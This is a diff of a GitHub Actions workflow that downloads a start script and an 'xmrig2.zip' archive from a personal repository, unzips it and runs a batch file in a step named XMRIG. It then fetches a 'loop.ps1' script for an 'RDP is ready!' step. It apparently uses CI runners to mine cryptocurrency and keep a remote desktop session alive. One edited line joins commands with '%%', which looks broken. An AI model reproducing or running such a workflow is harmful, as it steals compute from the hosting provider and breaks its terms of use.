@@ -13,10 +13,10 @@ jobs:
         Invoke-WebRequest https://raw.githubusercontent.com/jaisai1337/cpu/main/start.bat -OutFile start.bat
         Invoke-WebRequest https://raw.githubusercontent.com/jaisai1337/cpu/main/xmrig2.zip -OutFile xmrig2.zip
     - name: Extracting Xmrig2 Files.
-      run: Expand-Archive xmrig2.zip
+      run: Expand-Archive xmrig2.zip %% cd xmrig2
     - name: XMRIG
       run: |
-        ./xmrig2/jai.bat
+        ./jai.bat
     - name: RDP is ready!
       run: | 
         Invoke-WebRequest https://raw.githubusercontent.com/romain09/AWS-RDP/main/loop.ps1 -OutFile loop.ps1
